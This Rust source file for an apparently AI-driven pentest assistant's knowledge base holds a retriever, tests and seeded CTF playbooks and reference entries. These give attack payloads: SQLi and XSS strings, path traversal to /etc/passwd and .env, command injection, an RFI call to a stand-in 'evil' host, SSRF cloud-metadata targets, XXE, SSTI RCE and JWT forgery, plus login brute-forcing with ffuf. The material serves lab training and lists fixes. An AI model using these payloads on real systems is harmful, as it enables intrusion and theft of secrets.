// Knowledge Base module
// Stores documents (uploaded files or manually written notes/competences)
// that get injected as context into AI prompts.

use std::path::PathBuf;
use std::collections::HashMap;

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum DocKind {
    UploadedFile,  // loaded from disk
    ManualNote,    // typed directly by the user
    Competence,    // skill/technique description written by user
}

impl DocKind {
    pub fn label(&self) -> &'static str {
        match self {
            DocKind::UploadedFile => "File",
            DocKind::ManualNote   => "Note",
            DocKind::Competence   => "Competence",
        }
    }
}

#[derive(Clone, Debug)]
pub struct KbDoc {
    pub id: usize,
    pub title: String,
    pub kind: DocKind,
    pub content: String,
    pub enabled: bool,   // whether to inject into AI context
    #[allow(dead_code)] // origin of uploaded docs; retained for future re-import
    pub source_path: Option<PathBuf>,
}

impl KbDoc {
    pub fn new_note(id: usize, title: String, content: String) -> Self {
        Self { id, title, kind: DocKind::ManualNote, content, enabled: true, source_path: None }
    }

    pub fn new_competence(id: usize, title: String, content: String) -> Self {
        Self { id, title, kind: DocKind::Competence, content, enabled: true, source_path: None }
    }

    pub fn from_file(id: usize, path: PathBuf) -> Result<Self, String> {
        let content = std::fs::read_to_string(&path)
            .map_err(|e| format!("Failed to read {}: {}", path.display(), e))?;
        let title = path.file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| format!("doc_{}", id));
        Ok(Self { id, title, kind: DocKind::UploadedFile, content, enabled: true, source_path: Some(path) })
    }

    /// Returns a truncated summary for display
    pub fn preview(&self) -> String {
        let s: String = self.content.chars().take(120).collect();
        if self.content.len() > 120 { format!("{}...", s) } else { s }
    }
}

/// Build the context block injected into every AI prompt.
/// Notes and Competences are behavioural instructions — they get up to 1500 chars each.
/// Uploaded files get up to 400 chars each.
/// Total cap is 6000 chars so multiple competences all fit.
/// Personal notes/competences are listed first so they are seen before file content.
pub fn build_context(docs: &[KbDoc]) -> String {
    let mut active: Vec<&KbDoc> = docs.iter().filter(|d| d.enabled).collect();
    if active.is_empty() {
        return String::new();
    }
    // Personal notes/competences first, then files
    active.sort_by_key(|d| match d.kind {
        DocKind::ManualNote   => 0,
        DocKind::Competence   => 1,
        DocKind::UploadedFile => 2,
    });

    let mut ctx = String::from("=== KNOWLEDGE BASE ===\n");
    for doc in &active {
        let per_doc_limit = match doc.kind {
            DocKind::ManualNote | DocKind::Competence => 1500,
            DocKind::UploadedFile => 400,
        };
        let content = if doc.content.len() > per_doc_limit {
            format!("{}[...]", &doc.content[..per_doc_limit])
        } else {
            doc.content.clone()
        };
        let entry = format!("[{}] {}\n{}\n\n", doc.kind.label(), doc.title, content);
        if ctx.len() + entry.len() > 6000 {
            ctx.push_str("[...remaining docs truncated]\n");
            break;
        }
        ctx.push_str(&entry);
    }
    ctx.push_str("=== END KB ===");
    ctx
}

/// Built-in pentest playbooks seeded into the Knowledge Base. Written as
/// keyword-dense competences so the BM25 retriever surfaces the right one for
/// whatever the agent is doing (brute-force, dir-busting, request analysis,
/// input exploitation, .env enumeration, flag hunting). Seeded once, by title;
/// the user can edit or disable them afterwards.
pub fn default_playbooks() -> Vec<(&'static str, &'static str)> {
    vec![
        ("Playbook: Engagement Goal & Flag Location",
"GOAL of every engagement on this lab: find the FLAG. The flag is stored in a .env \
(dotenv / environment) file of the target web application — typically as a line like \
FLAG=FLAG{...} or SECRET_FLAG=... . So the win condition is: get the contents of a .env \
file and read the flag value. Flag format is usually FLAG{...} or flag{...}. \
Strategy to reach it: (1) map the app (crawl/spider), (2) find input/injection points, \
(3) enumerate for exposed sensitive files especially .env, (4) read the .env, (5) extract FLAG. \
Always keep 'find the .env, read the flag' as the objective and remember any path that exposes files."),

        ("Playbook: Password Brute-Force with a Known Email",
"When you have a valid email/username and must brute-force the password on a login form:\n\
1. FIRST inspect the login with the Repeater or curl: send one request, read the exact response \
to a WRONG password — note its status code AND body size. That is your 'failure baseline'.\n\
2. Build the attack with ffuf as a POST to the login endpoint:\n\
   ffuf -u <TARGET>/login -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
-d 'email=<the email>&password=FUZZ'\n\
   - FUZZ goes ONLY in the password field, never in the URL.\n\
   - Do NOT add -mc/-fc/-fs match flags: brute-force is auto-calibrated (-ac) so a real hit \
(different size/redirect/200 vs the failure baseline) stands out automatically.\n\
   - Provide a password wordlist; a user-named file path is honoured, else the Passwords list is used.\n\
3. A candidate valid credential = the password whose response differs from the failure baseline \
(e.g. 302 redirect to /dashboard, or a different size). Record email+password as a finding."),

        ("Playbook: Directory & File Busting (find hidden paths and .env)",
"Discover hidden directories, endpoints and sensitive files with ffuf or gobuster:\n\
   ffuf -u <TARGET>/FUZZ            (FUZZ in the URL path; a wordlist is auto-injected)\n\
   gobuster dir -u <TARGET> -w <wordlist>\n\
Interpret status codes: 200=exists, 301/302=redirect (often a real dir), 403=exists but forbidden \
(interesting!), 401=auth required, 404=nothing.\n\
HIGH-VALUE targets to look for: .env, .env.local, .env.bak, /.env, config.php, config.json, \
wp-config.php, .git/ , .git/config, backup.zip, backup.sql, db.sql, dump.sql, .htaccess, \
robots.txt, sitemap.xml, /admin, /api, /debug, phpinfo.php, .DS_Store. \
Because the flag is in a .env, ALWAYS test for .env and /.env and similar dotfiles directly."),

        ("Playbook: Crawl/Spider the App Intelligently",
"Before attacking, map the application. Use the in-app Spider (ACTION: spider) or fetch pages with \
curl and extract links/forms. Goal: enumerate every endpoint, form, input field, parameter, and \
JS file. From the crawl, note: login/auth endpoints, forms and their field names, URL query \
parameters, API routes (/api/...), upload features, and any references to config or env files. \
Feed discovered endpoints into directory busting and request analysis. Prioritise pages with user \
input and anything that hints at file access or configuration."),

        ("Playbook: Capture & Read Requests, Place Payloads Intelligently",
"Use the Proxy (intercept ON) and the Repeater to capture and understand real requests, then craft \
payloads precisely:\n\
1. proxy_start to capture traffic, or set up the Repeater: repeater_url / repeater_method / \
repeater_header / repeater_body, then repeater_send to get the REAL response.\n\
2. Read the request: identify the method, every parameter (query, body, JSON keys, headers, cookies, \
tokens), and how the server reflects or uses each value in the response.\n\
3. Identify which inputs reach a sink: values reflected in HTML (XSS), used in queries (SQLi), \
rendered in templates (SSTI), used in file paths (LFI/path traversal), or executed (command \
injection).\n\
4. Place the payload in the SPECIFIC parameter that influences the response, change ONE thing at a \
time, resend with the Repeater, and compare the response to baseline to confirm the behaviour."),

        ("Playbook: Find Patterns in User Input and Exploit Them",
"To find and exploit an injection from user input:\n\
1. Enumerate inputs: form fields, URL params (?id=, ?file=, ?q=, ?page=), JSON body keys, headers, cookies.\n\
2. Probe each for a behaviour change (send a benign marker, then a breaking char) and watch the response:\n\
   - SQLi: ' or 1=1-- , ' OR '1'='1 , '\"  → SQL errors, different row counts, auth bypass.\n\
   - XSS: <script>alert(1)</script>, \" onmouseover=alert(1), <img src=x onerror=alert(1)> → reflected unsanitised.\n\
   - Path traversal / LFI: ../../../../etc/passwd , ?file=../../.env → file contents leak (use this to read .env!).\n\
   - SSTI: {{7*7}} , ${7*7} → renders 49.\n\
   - Command injection: ; id , | id , && whoami → command output appears.\n\
3. Confirm by the response differing from baseline, then escalate: e.g. a working LFI/path-traversal or \
file-read parameter can be pointed at .env to retrieve the flag. Pattern: input that controls a file \
path or query is the fastest route to the .env."),

        ("Playbook: Enumerate .env and Sensitive Files to Get the Flag",
"The flag lives in a .env file. Concrete ways to reach it:\n\
1. Direct fetch: curl <TARGET>/.env  (also try /.env.local, /.env.bak, /.env.save, /env, \
/config/.env, /api/.env, /.git/config). A 200 with KEY=VALUE lines means it's exposed — grep for FLAG.\n\
2. Path traversal / LFI: if any parameter reads a file (?file=, ?path=, ?page=, ?template=), point it at \
the .env: ?file=../../.env or ?file=.env — the response leaks env vars including the flag.\n\
3. Source/backup disclosure: .env.bak, .env~, .env.swp, backups, or .git history (.git/config, \
/.git/HEAD) can contain the env file.\n\
4. Once you read the .env, extract the flag: look for FLAG=, FLAG{, SECRET, TOKEN. Report the flag value \
as a finding and pin it to the Mind Base.\n\
ALWAYS try /.env early — on this lab it is the objective."),

        ("Playbook: Recon-Before-Attack Workflow (full chain)",
"Default operating procedure to go from nothing to the flag:\n\
1. Connectivity + fingerprint: curl -sI <TARGET> (status, server, redirects).\n\
2. Crawl/spider to map endpoints, forms, parameters.\n\
3. Directory & file busting for hidden paths and especially .env / config / backup files.\n\
4. For each input found, capture a real request (Repeater), read it, and test for injection patterns.\n\
5. Use any file-read/LFI/traversal or exposed .env to read the environment file.\n\
6. Extract the FLAG from the .env and record it.\n\
Throughout: inspect REAL responses with the Repeater before assuming, change one variable at a time, \
and remember (Mind Base) every endpoint, credential, token, and the failure baseline so a real hit is obvious."),

        ("Cybersecurity Slang & Jargon Glossary",
"Interpret hacker/pentest slang the operator uses. When you see a slang term, treat it as its meaning \
and ACT accordingly (run the matching tool), don't say you 'don't recognise the command'.\n\
- dirbust / dirbusting / dir bust / dirb / content discovery = DIRECTORY BUSTING: brute-force hidden \
directories & files with ffuf or gobuster (ffuf -u <target>/FUZZ). 'gobuster it' means the same.\n\
- fuzz / fuzzing = send many payloads to an input/path to find hidden things or bugs (ffuf).\n\
- creds = credentials (username/email + password). combo list = user:pass pairs.\n\
- brute / bruteforce / bruteforcing = try many passwords/values (ffuf/hydra). \
password spraying = one common password across many users. creds stuffing = known leaked creds.\n\
- recon = reconnaissance (info gathering). enum / enumeration = list things (users, dirs, endpoints, \
subdomains). sub enum = subdomain enumeration (subfinder). OSINT = open-source intel.\n\
- foothold = initial access. priv esc / privesc = privilege escalation. lateral movement / pivot = \
move to other hosts. rooted / owned / pwned / popped = fully compromised.\n\
- shell = command execution on target. reverse shell = target connects back to you. bind shell = \
target opens a port. webshell = shell via an uploaded web script.\n\
- payload = the input/code that triggers a bug. POC / PoC = proof of concept. \
low-hanging fruit = easy wins.\n\
- LFI = local file inclusion. RFI = remote file inclusion. RCE = remote code execution. \
SQLi = SQL injection. XSS = cross-site scripting. SSRF, CSRF, XXE, SSTI, IDOR = common web bug classes. \
traversal / path traversal = ../../ to read files (e.g. read .env).\n\
- 403 bypass = tricks to reach a forbidden path. deface = alter a page.\n\
- hash cracking = recover a password from its hash (hashcat/john). salt, rainbow table = hash concepts. \
token / JWT = auth token; session hijacking = steal a session.\n\
- vhost = virtual host fuzzing. param = URL/body parameter. endpoint = a route/URL. \
dotfiles = files like .env, .git (often leak secrets).\n\
- c2 / C2 = command & control. exfil = data exfiltration. TTPs = tactics/techniques/procedures. \
honeypot = decoy. CTF = capture-the-flag challenge; the flag looks like FLAG{...} or flag{...}.\n\
- tool nicknames: burp=Burp Suite proxy; nmap=port scanner; sqlmap=SQLi tool; nuclei=template scanner; \
ffuf/gobuster=fuzzers; hydra=login bruteforcer; nikto=web scanner; katana=crawler."),
    ]
}

/// A concise reference library of the common web vulnerability classes and
/// core concepts. Seeded into the KB so the AI Assistant can answer like a
/// security library and the agent has grounding to reason from. Each entry is
/// short enough to be retrieved whole by the BM25 selector.
pub fn default_reference_library() -> Vec<(&'static str, &'static str)> {
    vec![
        ("Reference: SQL Injection (SQLi)",
"SQL injection = untrusted input concatenated into a SQL query.\n\
Detect: break the query with ' or \" and watch for SQL errors, different row counts, or timing changes.\n\
Classic payloads: ' OR '1'='1 , ' OR 1=1-- - , admin'-- - , ' UNION SELECT NULL,NULL-- -\n\
Types: error-based (DB errors leak data), UNION-based (append columns), boolean-blind (true/false via \
response differences), time-blind (SLEEP(5)/pg_sleep(5) delays), out-of-band.\n\
Enumerate: ORDER BY N to count columns; UNION SELECT to pull version(), current_user, table_name from \
information_schema.tables.\n\
Auth bypass: put ' OR 1=1-- - in the username to log in without a password.\n\
Tooling: sqlmap -u <url> --batch --dbs. Fix: parameterised queries / prepared statements, least privilege."),

        ("Reference: Cross-Site Scripting (XSS)",
"XSS = attacker-controlled script executes in a victim's browser.\n\
Reflected: payload in the request is echoed unsanitised into the response. Stored: payload persisted \
(comments, profiles) and served to others. DOM: client-side JS writes input into a sink (innerHTML, \
document.write, eval).\n\
Probes: <script>alert(1)</script> ; \"><img src=x onerror=alert(1)> ; ' onmouseover=alert(1) ; \
javascript:alert(1) in href/src.\n\
Context matters: HTML body vs attribute vs JS string vs URL — break out of the current context first.\n\
Filter bypass: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, mixed case, encoded entities.\n\
Impact: session/cookie theft, keylogging, CSRF token theft, account takeover. Fix: contextual output \
encoding, CSP, HttpOnly cookies."),

        ("Reference: SSRF (Server-Side Request Forgery)",
"SSRF = you make the server fetch a URL you control. Look for params taking a URL/host: url=, next=, \
image=, feed=, webhook=, proxy=, callback=.\n\
Targets: internal services (http://127.0.0.1, http://localhost:port), cloud metadata \
(http://169.254.169.254/latest/meta-data/ on AWS, metadata.google.internal on GCP), internal admin panels.\n\
Bypasses: alternate IP encodings (2130706433, 0x7f000001, 127.1), DNS rebinding, redirects, \
[::1], enclosed alphanumerics.\n\
Impact: read cloud creds, hit internal APIs, port-scan the internal network. Fix: allow-list egress, \
block link-local/loopback, disable unused URL schemes."),

        ("Reference: IDOR / Broken Access Control",
"IDOR = accessing another user's object by changing an identifier you shouldn't control. Look for \
/api/users/123, ?id=123, ?account=, ?doc=, order numbers, filenames.\n\
Test: log in as user A, note an object ID, then change it to user B's ID (or increment/decrement). If \
you get B's data back, it's an IDOR.\n\
Also test: forced browsing to admin routes (/admin, /api/admin), HTTP method swaps (GET vs DELETE), \
mass-assignment of role/isAdmin fields.\n\
Impact: data theft, privilege escalation, account takeover. Fix: server-side authorization on every \
object access, not just authentication."),

        ("Reference: Path Traversal & LFI/RFI",
"Path traversal = ../ sequences escape the intended directory to read arbitrary files. Params: file=, \
path=, page=, template=, include=, download=.\n\
Payloads: ../../../../etc/passwd , ..%2f..%2f.. (encoded), ....//....// (filter bypass), \
/var/www/.env , php://filter/convert.base64-encode/resource=index.php.\n\
LFI (local file inclusion) executes/reads local files; can escalate to RCE via log poisoning, session \
files, or PHP wrappers. RFI pulls a remote file (?page=http://evil/shell.txt) when allow_url_include is on.\n\
On CTF labs, point traversal at the .env to read the FLAG. Fix: canonicalise + allow-list paths, never \
pass user input to file APIs."),

        ("Reference: Command Injection",
"OS command injection = input reaches a shell. Look for features that ping/lookup/convert/exec: host=, \
cmd=, ip=, domain=, filename passed to a shell tool.\n\
Separators: ; id | id & id && whoami `id` $(id) %0a id (newline).\n\
Blind: time delay (; sleep 5), out-of-band (curl to your listener), or write to a readable file.\n\
Impact: full server compromise. Fix: avoid shells (use exec arrays / language APIs), strict allow-lists, \
never pass user input as shell arguments."),

        ("Reference: XXE (XML External Entity)",
"XXE = an XML parser resolves attacker-defined external entities. Present anywhere XML/SOAP/SVG/DOCX is \
parsed.\n\
Read files: <!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]> then reference &x; in the body.\n\
SSRF via XXE: SYSTEM \"http://169.254.169.254/...\". Blind XXE: use an external DTD to exfiltrate over \
HTTP/FTP. Billion-laughs = XML DoS.\n\
Impact: file read, SSRF, DoS. Fix: disable external entities and DOCTYPE processing in the parser."),

        ("Reference: SSTI (Server-Side Template Injection)",
"SSTI = user input rendered as a template expression. Detect with math: {{7*7}} , ${7*7} , #{7*7} , \
<%= 7*7 %> — a response of 49 confirms it.\n\
Engine fingerprint: {{7*'7'}} → 7777777 (Jinja2/Python) vs 49 (Twig). \
Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()...}} or {{config.__class__...}}; \
Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}; Freemarker: <#assign ex=..>.\n\
Impact: often RCE. Fix: don't render user input as templates; sandbox the engine."),

        ("Reference: JWT Attacks",
"JSON Web Token = header.payload.signature (base64url). Common flaws:\n\
- alg:none — strip the signature and set the header alg to \"none\"; some libs accept it unsigned.\n\
- Weak HMAC secret — brute-force the HS256 key (hashcat -m 16500) then forge tokens.\n\
- alg confusion (RS256→HS256) — sign with the public key as the HMAC secret.\n\
- Unverified signature, expired-but-accepted (no exp check), kid header injection (path/SQLi).\n\
Tamper the payload to escalate: change sub, role, isAdmin. Use the in-app JWT tab to decode/edit/re-sign. \
Fix: verify signature + alg allow-list, strong secrets, check exp/aud/iss."),

        ("Reference: Authentication & Session Attacks",
"Weaknesses to test on login/session flows:\n\
- Credential brute-force / password spraying / credential stuffing (calibrate the failure baseline first).\n\
- User enumeration via different error messages or response timings for valid vs invalid usernames.\n\
- Weak password reset (guessable tokens, host header poisoning, token not invalidated).\n\
- Session fixation, missing rotation on login, long-lived tokens, predictable session IDs.\n\
- Missing rate-limiting / lockout; MFA bypass (backup codes, response tampering).\n\
- Cookie flags: Secure, HttpOnly, SameSite. Fix: strong hashing (bcrypt/argon2), lockouts, secure cookies."),

        ("Reference: CSRF & CORS",
"CSRF = the victim's browser is tricked into sending an authenticated state-changing request. Exploitable \
when the action relies only on cookies with no anti-CSRF token and no SameSite. PoC: an auto-submitting \
<form> or <img> to the target endpoint. Fix: per-request CSRF tokens, SameSite=Lax/Strict, re-auth for \
sensitive actions.\n\
CORS misconfig = over-permissive cross-origin sharing. Dangerous: Access-Control-Allow-Origin reflects \
the request Origin AND Allow-Credentials:true → any site can read authenticated responses. Also test \
null origin and trusted-suffix bypasses. Fix: strict origin allow-list, never reflect Origin with \
credentials."),

        ("Reference: File Upload Vulnerabilities",
"Insecure upload = attacker stores an executable/dangerous file. Test: upload a webshell (shell.php, \
.phtml, .jsp) and reach it to get RCE.\n\
Bypasses: double extension (shell.php.jpg), null byte (shell.php%00.jpg), content-type spoofing, magic-byte \
prefix, case tricks (.pHp), SVG/HTML for stored XSS, path traversal in the filename to control location.\n\
Impact: RCE, stored XSS, overwrite. Fix: allow-list extensions + content types, rename files, store \
outside webroot, serve with a non-executing handler."),

        ("Reference: HTTP Status Codes & Recon Signals",
"Reading responses during recon:\n\
200 OK = exists/served. 301/302 = redirect (often a real dir or auth gate — follow it). 401 = auth \
required. 403 = exists but forbidden (interesting — try 403-bypass tricks). 404 = nothing. 405 = method \
not allowed (try other verbs). 429 = rate-limited. 500 = server error (may leak stack traces/versions).\n\
Signals worth noting: Server/X-Powered-By banners (version → CVE lookup), Set-Cookie flags, verbose \
error pages, differing response SIZE for the same status (the key to blind/brute-force calibration), \
CORS/CSP headers, and any reflected input."),

        ("Reference: OSINT Methodology",
"Open-source intel on a person/company:\n\
- Google dorking: \"Full Name\", site:linkedin.com \"name\", intitle:, inurl:, filetype:pdf, \
\"@company.com\" for email formats, site:github.com for code/leaks.\n\
- People: LinkedIn (role/employer), Twitter/X, GitHub (repos, commit emails), Crunchbase (company \
leadership), gravatar, data-breach lookups.\n\
- Company: domain WHOIS, subdomains (subfinder), job posts (tech stack), SSL cert names, \
BuiltWith/Wappalyzer for the stack.\n\
- Corroborate across multiple sources before asserting identity; note confidence. Use the OSINT tab's \
AI Investigation to automate dork+scrape+synthesise. Stay within legal/authorised scope."),

        ("Reference: PTES Report Standard (pentest report structure)",
"The Penetration Testing Execution Standard (PTES) defines how a professional pentest report is \
structured. Use this exact skeleton when writing or generating a report (e.g. the AI Draft in the \
Engagement > Report tab), tailoring depth to the audience.\n\
\n\
PTES divides reporting into two parts: an EXECUTIVE SUMMARY (for management, non-technical) and a \
TECHNICAL REPORT (for engineers).\n\
\n\
1. EXECUTIVE SUMMARY — business-focused, no jargon:\n\
   - Background / purpose of the engagement.\n\
   - Overall Posture: a plain-language verdict on the security state.\n\
   - Risk Ranking / Profile: an overall risk score/level and why.\n\
   - General Findings: a concise synthesis (with a simple metric/chart of issues by severity).\n\
   - Recommendation Summary: high-level remediation roadmap, prioritised.\n\
   - Strategic Roadmap: near/medium/long-term actions tied to business risk.\n\
\n\
2. TECHNICAL REPORT — reproducible detail for fixers:\n\
   - Scope: targets, IPs/domains, in-scope vs out-of-scope, exclusions.\n\
   - Methodology / Approach: phases performed (intel gathering, threat modelling, vuln analysis, \
exploitation, post-exploitation), tools used, timeline.\n\
   - Attack Narrative: the chronological story of how access/impact was achieved.\n\
   - Per-Finding detail, one block each:\n\
       * Title\n\
       * Severity (Critical/High/Medium/Low/Info) + CVSS if available\n\
       * Affected asset(s) / endpoint(s)\n\
       * Description (the vulnerability and root cause)\n\
       * Evidence / Proof of Concept (request/response, payload, screenshots-as-text, exact steps to reproduce)\n\
       * Impact (what an attacker gains — business terms too)\n\
       * Likelihood\n\
       * Remediation (specific, actionable fix) + references (CWE/CVE/OWASP).\n\
   - Risk Assessment: aggregate severity, exploitability, exposure.\n\
   - Conclusion.\n\
   - Appendices: raw tool output, full request logs, wordlists, additional evidence.\n\
\n\
Rules of good reporting: severity uses a consistent scale; every finding is reproducible; remediation \
is concrete (not 'harden the server'); executive summary must stand alone without the technical part; \
never include real secrets/credentials in cleartext beyond what's needed to prove the finding."),
    ]
}

// ─────────────────────────────────────────────────────────────────────────────
// Query-aware retrieval (BM25). Instead of dumping the whole KB into every
// prompt — which makes a large KB slow — we inject only the few passages most
// relevant to the current question. This keeps the prompt small and the model
// fast no matter how large the KB grows. Fully local: no embedding model, no
// network, deterministic.
//
// Strategy:
//   • Notes + Competences are short, user-curated, always-applicable guidance,
//     so they are always included (bounded).
//   • Uploaded files (the part that can grow huge) are chunked and the top-k
//     chunks for the query are retrieved via BM25.
// ─────────────────────────────────────────────────────────────────────────────

const ALWAYS_BUDGET: usize = 1000; // chars of always-on manual notes
const RETRIEVE_BUDGET: usize = 3200; // chars of retrieved competence/file chunks
const CHUNK_CHARS: usize = 1200; // target chunk size (keeps a playbook whole)
const TOP_K: usize = 4; // max chunks injected

/// Build KB context tailored to `query`: always-on curated notes plus the most
/// relevant retrieved file passages. Prompt size stays bounded (~4 KB) however
/// large the KB is.
pub fn build_context_for_query(docs: &[KbDoc], query: &str) -> String {
    let active: Vec<&KbDoc> = docs.iter().filter(|d| d.enabled).collect();
    if active.is_empty() { return String::new(); }

    // 1) Manual notes — short, user-curated, always-applicable. Always included.
    let mut curated = String::new();
    for d in active.iter().filter(|d| matches!(d.kind, DocKind::ManualNote)) {
        let entry = format!("[{}] {}\n{}\n\n", d.kind.label(), d.title, d.content);
        if curated.len() + entry.len() > ALWAYS_BUDGET {
            let room = ALWAYS_BUDGET.saturating_sub(curated.len());
            if room > 80 { curated.push_str(&safe_truncate(&entry, room)); curated.push_str("[...]\n"); }
            break;
        }
        curated.push_str(&entry);
    }

    // 2) Competences (playbooks) + uploaded files can both be large/numerous, so
    //    retrieve only the chunks relevant to this query via BM25.
    let corpus: Vec<&KbDoc> = active.into_iter()
        .filter(|d| matches!(d.kind, DocKind::Competence | DocKind::UploadedFile)).collect();
    let retrieved = retrieve_chunks(&corpus, query);

    if curated.is_empty() && retrieved.is_empty() { return String::new(); }
    let mut out = String::from("=== KNOWLEDGE BASE (most relevant to this query) ===\n");
    out.push_str(&curated);
    out.push_str(&retrieved);
    out.push_str("=== END KB ===");
    out
}

/// BM25 retrieval over chunked file docs. Returns the top chunks for the query,
/// formatted with their source title, within RETRIEVE_BUDGET chars.
fn retrieve_chunks(files: &[&KbDoc], query: &str) -> String {
    let q_terms = tokenize(query);
    if files.is_empty() || q_terms.is_empty() { return String::new(); }

    // Build chunks with their term frequencies.
    struct Chunk { title: String, text: String, tf: HashMap<String, u32>, dl: f64 }
    let mut chunks: Vec<Chunk> = Vec::new();
    for d in files {
        for piece in chunk_text(&d.content) {
            let tf = term_freq(&piece);
            if tf.is_empty() { continue; }
            let dl = tf.values().sum::<u32>() as f64;
            chunks.push(Chunk { title: d.title.clone(), text: piece, tf, dl });
        }
    }
    if chunks.is_empty() { return String::new(); }

    // Document frequencies + corpus stats.
    let n = chunks.len() as f64;
    let avgdl = chunks.iter().map(|c| c.dl).sum::<f64>() / n;
    let mut df: HashMap<&str, u32> = HashMap::new();
    for c in &chunks {
        for t in c.tf.keys() { *df.entry(t.as_str()).or_insert(0) += 1; }
    }

    // BM25 score every chunk against the query.
    let (k1, b) = (1.5_f64, 0.75_f64);
    let mut scored: Vec<(f64, usize)> = chunks.iter().enumerate().map(|(i, c)| {
        let mut s = 0.0;
        for qt in &q_terms {
            if let Some(&f) = c.tf.get(qt) {
                let n_qi = *df.get(qt.as_str()).unwrap_or(&0) as f64;
                let idf = (((n - n_qi + 0.5) / (n_qi + 0.5)) + 1.0).ln();
                let f = f as f64;
                s += idf * (f * (k1 + 1.0)) / (f + k1 * (1.0 - b + b * c.dl / avgdl));
            }
        }
        (s, i)
    }).collect();
    scored.sort_by(|a, b| b.0.partial_cmp(&a.0).unwrap_or(std::cmp::Ordering::Equal));

    // Emit the best chunks within budget.
    let mut out = String::new();
    let mut used = 0usize;
    for (score, i) in scored.into_iter().take(TOP_K) {
        if score <= 0.0 { break; }
        let c = &chunks[i];
        let body = c.text.trim();
        if used + body.len() > RETRIEVE_BUDGET { continue; }
        out.push_str(&format!("[KB: {}]\n{}\n\n", c.title, body));
        used += body.len();
    }
    out
}

/// Split text into ~CHUNK_CHARS pieces, preferring paragraph boundaries so a
/// chunk stays semantically coherent.
fn chunk_text(text: &str) -> Vec<String> {
    let mut chunks = Vec::new();
    let mut cur = String::new();
    for para in text.split("\n\n") {
        let para = para.trim();
        if para.is_empty() { continue; }
        if cur.len() + para.len() + 1 > CHUNK_CHARS && !cur.is_empty() {
            chunks.push(std::mem::take(&mut cur));
        }
        if para.len() > CHUNK_CHARS {
            // A single huge paragraph — hard-split it on char boundaries.
            let mut rest = para;
            while rest.len() > CHUNK_CHARS {
                let cut = floor_char_boundary(rest, CHUNK_CHARS);
                chunks.push(rest[..cut].to_string());
                rest = &rest[cut..];
            }
            if !rest.is_empty() { cur.push_str(rest); }
        } else {
            if !cur.is_empty() { cur.push('\n'); }
            cur.push_str(para);
        }
    }
    if !cur.trim().is_empty() { chunks.push(cur); }
    chunks
}

/// Lowercase, split on non-alphanumerics, drop stopwords and 1-char tokens.
fn tokenize(s: &str) -> Vec<String> {
    s.to_lowercase()
        .split(|c: char| !c.is_alphanumeric())
        .filter(|w| w.len() >= 2 && !is_stopword(w))
        .map(|w| w.to_string())
        .collect()
}

fn term_freq(s: &str) -> HashMap<String, u32> {
    let mut tf = HashMap::new();
    for t in tokenize(s) { *tf.entry(t).or_insert(0) += 1; }
    tf
}

fn is_stopword(w: &str) -> bool {
    matches!(w,
        "the" | "and" | "for" | "are" | "was" | "with" | "that" | "this" | "from" |
        "you" | "your" | "what" | "which" | "have" | "has" | "but" | "not" | "can" |
        "all" | "any" | "how" | "why" | "who" | "does" | "did" | "will" | "would" |
        "about" | "into" | "out" | "use" | "using" | "get" | "got" | "let" | "its")
}

fn safe_truncate(s: &str, max: usize) -> String {
    let cut = floor_char_boundary(s, max);
    s[..cut].to_string()
}

/// Largest char boundary ≤ idx (avoids slicing mid-UTF-8).
fn floor_char_boundary(s: &str, idx: usize) -> usize {
    if idx >= s.len() { return s.len(); }
    let mut i = idx;
    while i > 0 && !s.is_char_boundary(i) { i -= 1; }
    i
}

#[cfg(test)]
mod rag_tests {
    use super::*;
    #[test]
    fn retrieval_is_bounded_and_relevant() {
        let mut docs = Vec::new();
        // One relevant file about JWT, plus 200 noise files.
        docs.push(KbDoc { id: 0, title: "auth-notes".into(), kind: DocKind::UploadedFile,
            content: "The login endpoint issues a JWT signed with HS256. The secret rotates daily. \
                      Tokens expire after 15 minutes and the refresh flow uses a httpOnly cookie.".into(),
            enabled: true, source_path: None });
        for i in 0..200 {
            docs.push(KbDoc { id: i+1, title: format!("noise-{i}"), kind: DocKind::UploadedFile,
                content: format!("Unrelated reference material number {i} about networking, DNS, \
                                  cabling, printers and office logistics. ").repeat(40),
                enabled: true, source_path: None });
        }
        let total: usize = docs.iter().map(|d| d.content.len()).sum();
        let ctx = build_context_for_query(&docs, "how is the JWT token signed and when does it expire?");
        println!("total KB size = {} bytes; injected context = {} bytes", total, ctx.len());
        assert!(ctx.len() < 4600, "context must stay bounded, got {}", ctx.len());
        assert!(ctx.contains("HS256"), "must retrieve the relevant JWT chunk");
        assert!(!ctx.contains("printers"), "must NOT pull in irrelevant noise");
    }

    #[test]
    fn playbooks_retrieve_per_task() {
        // Seed the built-in playbooks as competences.
        let docs: Vec<KbDoc> = default_playbooks().into_iter().enumerate()
            .map(|(i, (t, c))| KbDoc::new_competence(i, t.to_string(), c.to_string()))
            .collect();

        let bf = build_context_for_query(&docs, "brute force the login password with this email using ffuf");
        assert!(bf.to_lowercase().contains("brute"), "brute-force query → brute-force playbook");
        assert!(bf.len() < 4600);

        let flag = build_context_for_query(&docs, "where is the flag, enumerate the .env file");
        assert!(flag.contains(".env"), "flag query → .env playbook");

        let dir = build_context_for_query(&docs, "find hidden directories and files");
        assert!(dir.to_lowercase().contains("busting") || dir.to_lowercase().contains("ffuf"),
            "dir query → directory busting playbook");

        // Slang glossary must be retrieved when the operator uses jargon.
        let slang = build_context_for_query(&docs, "do you know how to dirbust?");
        assert!(slang.to_lowercase().contains("directory busting"),
            "slang 'dirbust' → glossary defines it as directory busting");
    }
}
